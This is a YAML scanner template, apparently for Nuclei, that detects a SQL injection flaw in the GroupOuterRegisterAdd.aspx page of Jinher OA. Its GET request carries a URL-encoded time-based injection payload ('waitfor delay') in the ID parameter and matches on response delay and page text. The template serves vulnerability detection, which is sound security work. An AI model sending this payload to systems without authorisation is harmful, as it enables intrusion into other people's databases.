id: poc-yaml-jinher-groupouterregisteradd-aspx-sqli
info:
  name: 金和OA GroupOuterRegisterAdd.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects SQL injection vulnerability in the 金和OA GroupOuterRegisterAdd.aspx endpoint.
variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"
http:
  - raw:
      - |
        GET /c6/Jhsoft.Web.AddMenu/GroupOuterRegisterAdd.aspx/?ID=%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a{{t1}}%27%2d%2d HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - contains(gbk_decode(body), "外部系统修改")
          - contains(gbk_decode(body), "系统名称")
          - contains(gbk_decode(body), "系统序号")
          - contains(body, "JHSoft")
          - duration >= to_number(t1)
          - duration <= to_number(t2)
